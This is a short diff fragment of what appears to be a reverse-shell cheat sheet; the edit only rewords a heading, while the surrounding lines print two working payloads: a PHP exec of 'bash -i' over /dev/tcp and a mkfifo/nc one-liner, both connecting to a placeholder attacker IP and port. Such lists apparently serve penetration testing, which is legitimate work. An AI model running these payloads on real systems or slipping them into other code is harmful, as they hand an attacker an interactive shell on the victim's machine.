@@ -176,7 +176,7 @@ php(file)
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'");?>
 ```
 
-for some special cases#1 
+special cases 1 
 
 ```shell
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <attacker port> >/tmp/f
